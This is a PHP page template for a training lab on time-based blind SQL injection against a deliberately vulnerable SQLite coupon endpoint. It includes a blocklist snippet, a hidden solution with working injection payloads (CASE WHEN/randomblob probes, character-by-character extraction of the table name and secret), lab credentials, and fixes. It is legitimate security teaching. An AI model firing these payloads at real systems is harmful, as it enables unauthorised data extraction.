<?php
require __DIR__ . '/_layout.php';

$lessons = require __DIR__ . '/lessons.php';
$lesson  = $lessons['sqli-blind'];

academy_layout_start($lesson['title']);
?>

<header class="academy-lesson-head">
    <div class="academy-lesson-eyebrow"><?= htmlspecialchars($lesson['category']) ?> &middot; Lab 03</div>
    <h1><?= htmlspecialchars($lesson['title']) ?></h1>
    <div class="academy-lesson-meta">
        <span class="academy-badge is-hard"><?= htmlspecialchars($lesson['difficulty']) ?></span>
        <span class="academy-badge is-ready">Ready</span>
    </div>
</header>

<?php academy_render_related_labs('sqli-blind'); ?>

<!-- 1. THEORY -->
<section class="academy-block">
    <h2>1. Theory</h2>
    <p>
        <strong>Blind SQL injection</strong> is what you reach for when the server is still
        executing your injected SQL but is not echoing the result anywhere. Instead of
        reading data out of the response body, you ask the database yes/no questions and
        infer the answer from something <em>observable</em>: a different status code, a
        different response length, or - when nothing else is observable - how long the
        server takes to reply.
    </p>
    <p>
        The cart&apos;s coupon endpoint is the classic case. Its SQL is concatenated, but
        the response is just &quot;Coupon Applied!&quot; or &quot;Invalid Coupon Code.&quot;
        - no leak channel. <strong>And UNION is explicitly blocked</strong>:
    </p>
    <pre><code>if (preg_match('/union/i', $code_input)) {
    $coupon_msg = "Security Alert: UNION keyword is forbidden!";
} else {
    $sql = "SELECT discount_val FROM CUPONS
             WHERE encrypted_code = '$code_input'";
    $res = $internal_db-&gt;query($sql);
    ...
}</code></pre>
    <p>
        That leaves <strong>time-based blind injection</strong>. SQLite has no
        <code>SLEEP()</code> function, but it has <code>randomblob(N)</code>, which
        allocates a large blob and is reliably slow for big <code>N</code>. We hide that
        inside a <code>CASE WHEN</code> so it only runs when our boolean question is true:
    </p>
    <pre><code>CASE WHEN (&lt;question&gt;) THEN randomblob(250000000) ELSE 1 END</code></pre>
    <p>
        If the server takes noticeably longer than the baseline (we use baseline + 0.5s),
        the answer was YES. Otherwise NO. With one yes/no probe per character per position
        in the alphabet, we can extract any string from the database, one letter at a time.
    </p>
    <div class="academy-callout">
        <strong>Why this lab is on a separate database:</strong> the coupons live in
        <code>internal.db</code>, not <code>app.db</code>. UNION on
        <code>products.php</code> would not see them. The exfiltration target - the
        VIP coupon <code>encrypted_code</code> - only exists here.
    </div>
</section>

<!-- 2. TASK -->
<section class="academy-block">
    <h2>2. Your task</h2>
    <ol>
        <li>Confirm the coupon field is injectable (a stray quote should not produce a
            visible error, but it must be reaching the SQL - otherwise time-based
            wouldn&apos;t work).</li>
        <li>Build a <code>CASE WHEN</code> + <code>randomblob</code> probe that you can
            time.</li>
        <li>Measure a baseline so you know what &quot;slow&quot; looks like.</li>
        <li>Discover the name of the coupons table from <code>sqlite_master</code>, one
            character at a time.</li>
        <li>
            <strong>Goal:</strong> leak the value of the <code>encrypted_code</code> column.
            On a freshly seeded DB the answer is <code>ANAN-VIP-2026</code>.
        </li>
    </ol>
    <p>
        You will need a valid <code>PHPSESSID</code> - the cart requires a logged-in user.
        Easiest is to register/login normally; you can also chain this lab on top of
        login-bypass SQLi.
    </p>
</section>

<!-- 3. START THE LAB -->
<section class="academy-block">
    <h2>3. Start the lab</h2>
    <p>The vulnerable cart page (with the coupon input) opens in a new tab. Log in
       first as <code>carlos</code> / <code>1234</code> if you are not already.</p>
    <a class="academy-lab-cta"
       href="<?= htmlspecialchars($lesson['target_url']) ?>"
       target="_blank" rel="noopener">Open vulnerable cart page</a>
</section>

<!-- 4. REVEAL SOLUTION -->
<details class="academy-solution" id="academy-solution">
    <summary>Reveal solution (spoilers!)</summary>
    <div class="academy-solution-body">
        <p class="academy-solution-warning">
            Try the lab on your own first. Reading the solution before attempting it
            yourself defeats the point of the exercise.
        </p>

        <h3>The probe template</h3>
        <pre><code>POST /CyberProject/cart.php
Cookie: PHPSESSID=&lt;your session&gt;

coupon_code=' OR (CASE WHEN (&lt;condition&gt;)
                  THEN randomblob(250000000) ELSE 1 END) --
apply_coupon=1</code></pre>
        <p>
            If <code>&lt;condition&gt;</code> evaluates to true the server hangs for several
            seconds allocating that 250&nbsp;MB blob; if false, it returns almost instantly.
            Note the trailing space after <code>--</code> (SQLite needs it).
        </p>

        <h3>Step 1 - baseline</h3>
        <p>POST a benign coupon (<code>coupon_code=test</code>) and record how long the
            response takes. Anything more than <code>baseline + 0.5s</code> is treated as a
            YES.</p>

        <h3>Step 2 - discover the table name</h3>
        <p>
            For each character position, walk the alphabet and ask:
        </p>
        <pre><code>UPPER(SUBSTR(
   (SELECT name FROM sqlite_master WHERE type='table' LIMIT 1),
   &lt;pos&gt;, 1
)) = '&lt;char&gt;'</code></pre>
        <p>
            The first time a query is slow, you have the letter at that position.
            <code>UPPER()</code> collapses case so the alphabet you have to scan is small.
            The first table happens to be <code>CUPONS</code>.
        </p>

        <h3>Step 3 - leak the secret</h3>
        <p>Same idea, but against the column you actually want:</p>
        <pre><code>UPPER(SUBSTR(
   (SELECT encrypted_code FROM CUPONS LIMIT 1),
   &lt;pos&gt;, 1
)) = '&lt;char&gt;'</code></pre>
        <p>
            Walk positions <code>1, 2, 3, ...</code> until no character matches - that is
            the end of the string. The full value is <code>ANAN-VIP-2026</code>.
        </p>

        <h3>Automated exploit</h3>
        <p>
            The script automates the baseline, the alphabet walk, table discovery, and the
            character-by-character data leak.
        </p>
        <div class="academy-script">
            <?php highlight_file(__DIR__ . '/../scripts/SQLi_Blind.py'); ?>
        </div>

        <h3>How to fix it (for context)</h3>
        <ul>
            <li>Replace concatenation with a prepared statement bound to
                <code>:code</code>. The <code>preg_match</code> blocklist is not a defence -
                it stops the obvious UNION but does nothing for time-based.</li>
            <li>Reject coupon codes that don&apos;t match a strict regex
                (<code>^[A-Z0-9-]{6,32}$</code>).</li>
            <li>Rate-limit the endpoint. The attack needs thousands of probes; even a
                modest delay per request makes it impractical.</li>
        </ul>
    </div>
</details>

<script>
(function () {
    var details = document.getElementById('academy-solution');
    if (!details) return;
    details.addEventListener('toggle', function () {
        if (this.open && !this.dataset.confirmed) {
            var ok = confirm('Are you sure you want to see the solution?\n\nTry the lab first - that is where the learning happens.');
            if (!ok) { this.open = false; } else { this.dataset.confirmed = '1'; }
        }
    });
})();
</script>

<p style="margin-top: 28px;">
    <a href="index.php">&larr; Back to all labs</a>
</p>

<?php
academy_layout_end();
